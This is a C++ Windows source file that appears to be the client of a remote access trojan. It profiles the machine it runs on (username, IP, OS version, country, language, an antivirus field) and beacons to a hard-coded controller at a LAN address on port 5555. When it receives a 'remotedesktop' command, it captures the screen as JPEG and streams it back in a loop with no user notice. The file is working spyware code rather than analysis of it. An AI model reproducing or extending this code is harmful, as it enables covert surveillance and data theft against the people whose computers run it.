#define _WINSOCK_DEPRECATED_NO_WARNINGS

#define _CRT_SECURE_NO_WARNINGS
#include "Networking.h"

#include <stdio.h>
#include <time.h>
#include <string>
#include <fstream>
#include <pplawait.h>
#include <stdlib.h>
#include <chrono>
#include <atomic>
#include <chrono>
#include <atomic>
#include <lmcons.h>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <cassert>
#include <iomanip>
#include <winternl.h>
using namespace std;

using namespace Gdiplus;




const size_t MAX_TCP_IMG_BUF = 1400;

enum MSGTYPE
{
	MSGTYPE_CMD,	// 数据是命令,后接 INPUT 结构体
	MSGTYPE_IMG,	// 数据是图片
	MSGTYPE_LAN,	// 发起连接，后接密码
	MSGTYPE_WP,		// 密码错误
	MSGTYPE_OK,		// 密码正确
	MSGTYPE_BYE		// 客户端告诉服务端断开
};

typedef struct _LanMsgHeader
{
	unsigned int nPackageSize;	// 包的总大小 = 包头 + 数据
	unsigned int nHeaderSize;	// 包头大小
	unsigned int nDataSize;		// 数据大小
	unsigned int nImageSize;	// 图像总大小
	MSGTYPE MsgType;			// 本条数据是什么类型
}LanMsgHeader;
const size_t MAX_RECV_BUF = 1024 * 1024;
#define HEAD_MARK "TEA"
void SplitSendImage(SOCKET m_socketCurrentConn,BYTE* pImgData, int nSize)
{
	size_t nPackageNum = nSize / MAX_TCP_IMG_BUF;
	size_t nLastPackageSize = nSize % MAX_TCP_IMG_BUF;
	if (nLastPackageSize != 0)
	{
		nPackageNum++;
	}

	size_t nTotalSize = MAX_TCP_IMG_BUF + sizeof(LanMsgHeader);
	LanMsgHeader lanHeader;
	lanHeader.MsgType = MSGTYPE_IMG;
	lanHeader.nImageSize = nSize;
	// 以下信息其实没用
	lanHeader.nHeaderSize = sizeof(lanHeader);
	lanHeader.nDataSize = nSize;
	lanHeader.nPackageSize = lanHeader.nDataSize + lanHeader.nHeaderSize;
	char* pBuf = new char[MAX_RECV_BUF];

	// 先发头部标记
	memcpy_s(pBuf, MAX_RECV_BUF, HEAD_MARK, sizeof(HEAD_MARK));
	send(m_socketCurrentConn, pBuf, sizeof(HEAD_MARK), 0);

	// 发结构体
	memcpy_s(pBuf, MAX_RECV_BUF, &lanHeader, sizeof(lanHeader));
	send(m_socketCurrentConn, pBuf, sizeof(lanHeader), 0);

	// 发图片数据
	//send(m_socketCurrentConn, (char*)pImgData, nSize, 0);

	for (size_t i = 0; i < nPackageNum; ++i)
	{
		size_t nDataSize = MAX_TCP_IMG_BUF;
		if (nLastPackageSize != 0 && i == nPackageNum - 1)
		{
			nDataSize = nLastPackageSize;
		}
		size_t nOffset = i * MAX_TCP_IMG_BUF;
		memcpy_s(pBuf, nTotalSize, pImgData + nOffset, nDataSize);
		send(m_socketCurrentConn, pBuf, nDataSize, 0);
	}
	delete[] pBuf;
}




string convertToString(char* a, int size)
{
	int i;
	string s = "";
	for (i = 0; i < size; i++) {
		s = s + a[i];
	}
	return s;
}


int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
	UINT  num = 0;          // number of image encoders
	UINT  size = 0;         // size of the image encoder array in bytes

	ImageCodecInfo* pImageCodecInfo = NULL;

	GetImageEncodersSize(&num, &size);
	if (size == 0)
		return -1;  // Failure

	pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
	if (pImageCodecInfo == NULL)
		return -1;  // Failure

	GetImageEncoders(num, size, pImageCodecInfo);

	for (UINT j = 0; j < num; ++j)
	{
		if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
		{
			*pClsid = pImageCodecInfo[j].Clsid;
			free(pImageCodecInfo);
			return j;  // Success
		}
	}

	free(pImageCodecInfo);
	return -1;  // Failure
}





int width = GetSystemMetrics(SM_CXSCREEN);
int height = GetSystemMetrics(SM_CYSCREEN);


vector<BYTE> ProccedImage(int quality);


string GetWindowsName()
{

	char username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);


	string temp = username;
	return temp;
}
string GetLanguage()
{
	char wcBuffer[512];

	GetLocaleInfo(LOCALE_USER_DEFAULT, LOCALE_SENGLANGUAGE, wcBuffer, 512);

	string temp = wcBuffer;
	return temp;
}


bool getosversion(OSVERSIONINFOEX* osversion) {
	NTSTATUS(WINAPI * RtlGetVersion)(LPOSVERSIONINFOEX);
	*(FARPROC*)&RtlGetVersion = GetProcAddress(GetModuleHandleA("ntdll"), "RtlGetVersion");

	if (RtlGetVersion != NULL)
	{

		return RtlGetVersion(osversion) == 0;
	}
	else {

#pragma warning(suppress : 4996)
		return GetVersionEx((LPOSVERSIONINFO)osversion);
	}
}

string GetOsVersion()
{
	OSVERSIONINFOEX osinfo;
	osinfo.dwOSVersionInfoSize = sizeof(osinfo);
	osinfo.szCSDVersion[0] = L'\0';

	if (!getosversion(&osinfo)) {
		std::cout << "Failed to get OS version\n";
	}

	string temp;

	char buffer[32];
	wsprintf(buffer, "%d", osinfo.dwMajorVersion);
	temp = buffer;
	memset(buffer, 0x0, sizeof(buffer));
	wsprintf(buffer, "%d", osinfo.dwMinorVersion);
	temp += ".";
	temp += buffer;
	return temp;
}

string GetCountry()
{
	GEOID myGEO = GetUserGeoID(GEOCLASS_NATION);
	int sizeOfBuffer = GetGeoInfo(myGEO, GEO_ISO2, NULL, 0, 0);
	char buffer[512];
	int result = GetGeoInfo(myGEO, GEO_ISO2, buffer, sizeOfBuffer, 0);
	string temp = buffer;
	return temp;
}


string  GetIp()
{


	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	int sock;
	char* hostAddress;
	struct addrinfo hints, * res;
	int err = 0;
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_DGRAM;
	char szHostName[255];
	gethostname(szHostName, 255);
	struct hostent* host_entry;
	getaddrinfo(szHostName, "000", &hints, &res);
	struct sockaddr_in* addr;
	struct addrinfo* rp;
	string temp;
	for (rp = res; rp != NULL; rp = rp->ai_next) {
		addr = (struct sockaddr_in*)rp->ai_addr;
		string host_addy = inet_ntoa((struct in_addr)addr->sin_addr);


		string ipv4 = "192.168";

		size_t find = host_addy.find(ipv4);

		if (find != string::npos)
		{
			temp += host_addy;
			temp += " : ";



		}


	}
	temp.pop_back();
	temp.pop_back();
	temp.pop_back();
	WSACleanup();

	return temp;
}
string  GetTime()
{


	SYSTEMTIME  lt;

	GetLocalTime(&lt);

	string temp;
	//   printf(" The local time is: %02d:%02d\n", lt.wHour, lt.wMinute);

	char buffer[512];
	wsprintf(buffer, "%d", lt.wHour);
	temp += buffer;
	temp += ":";
	memset(buffer, 0x0, sizeof(buffer));
	wsprintf(buffer, "%d", lt.wMinute);
	temp += buffer;

	return temp;
}
bool ICreateNetwork123::initsock()
{


	string buffer = "hello.";


	WSADATA wsa_data;
	SOCKADDR_IN addr;

	WSAStartup(MAKEWORD(2, 0), &wsa_data);
	server = socket(AF_INET, SOCK_STREAM, 0);

	InetPton(AF_INET, "192.168.1.103", &addr.sin_addr.s_addr);

	addr.sin_family = AF_INET;
	addr.sin_port = htons(5555);

	connect(server, reinterpret_cast<SOCKADDR*>(&addr), sizeof(addr));
	cout << "Connected to server!" << endl;
	string message;

	int yes = 1;
	int result = setsockopt(server,
		IPPROTO_TCP,
		TCP_NODELAY,
		(char*)&yes,
		sizeof(int));    // 1 - on, 0 - off




	int counter = 0;







	




	char sendbuffer[20];
	while (1)
	{






		string status = "connected";



		string antivirus = "N/A";

		string code = "999";
		string MainInfo = GetIp() + code + GetWindowsName() + code + GetOsVersion() + code + status + code + antivirus + code + GetCountry() + code + GetLanguage() + code + GetTime() + code;


		send(server, reinterpret_cast<char*>(&MainInfo[0]), MainInfo.length(), 0);


		while (true)
		{

			memset(sendbuffer, 0x0, sizeof(sendbuffer) / sizeof(char));
			recv(server, reinterpret_cast<char*>(&sendbuffer[0]), sizeof(sendbuffer) / sizeof(char), 0);
			string command = sendbuffer;
			std::string looking_command("remotedesktop");

			// different member versions of find in the same order as above:
			std::size_t found = command.find(looking_command);
			memset(sendbuffer, 0x0, sizeof(sendbuffer) / sizeof(char));
			if (found != std::string::npos)
			{
				while (1)
				{

					std::cout << "sending";
					GdiplusStartupInput gdiplusStartupInput;
					ULONG_PTR gdiplusToken;
					GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
					vector<BYTE> lines = ProccedImage(20);
					BYTE* pbyte = &(lines[0]);
					std::cout << lines.size() << endl;
					SplitSendImage(server, pbyte, lines.size() * sizeof(BYTE));
					GdiplusShutdown(gdiplusToken);
					Sleep(25);
				}
			}
		}


	}

	closesocket(server);
	WSACleanup();
	cout << "Socket closed." << endl << endl;

	return true;
}

ICreateNetwork123::ICreateNetwork123()
{


    //ICreateNetwork123::initsock();
	
}
bool ICreateNetwork123::sendPacket( const char FAR* buf , size_t size)
{

    if (send(server, buf, size, 0)<0)
    {

        printf("\n Send Failed \n");
        return false;


    }
    return true;
}

vector<BYTE> ProccedImage(int quality1)
{
	CLSID             encoderClsid;
	EncoderParameters encoderParameters;
	ULONG             quality;
	Status            stat;
	GetEncoderClsid(L"image/jpeg", &encoderClsid);
	HDC hdc = GetDC(0);
	POINT p;
	GetCursorPos(&p);
	HDC memdc = CreateCompatibleDC(hdc);
	HBITMAP hbitmap = CreateCompatibleBitmap(hdc, width, height);
	HGDIOBJ oldbmp = SelectObject(memdc, hbitmap);
	BitBlt(memdc, 0, 0, width, height, hdc, 0, 0, SRCCOPY | CAPTUREBLT);
	SelectObject(memdc, oldbmp);
	DeleteDC(memdc);
	vector<BYTE> buf;
	IStream* stream = NULL;
	HRESULT hr = CreateStreamOnHGlobal(0, TRUE, &stream);
	ULARGE_INTEGER liSize;
	Gdiplus::Bitmap bitmap(hbitmap, nullptr);
	encoderParameters.Count = 1;
	encoderParameters.Parameter[0].Guid = EncoderQuality;
	encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
	encoderParameters.Parameter[0].NumberOfValues = 1;
	quality = quality1;
	encoderParameters.Parameter[0].Value = &quality;
	bitmap.Save(stream, &encoderClsid, &encoderParameters);
	IStream_Size(stream, &liSize);
	DWORD len = liSize.LowPart;
	IStream_Reset(stream);
	buf.resize(len);
	IStream_Read(stream, &buf[0], len);
	stream->Release();

	return buf;




}

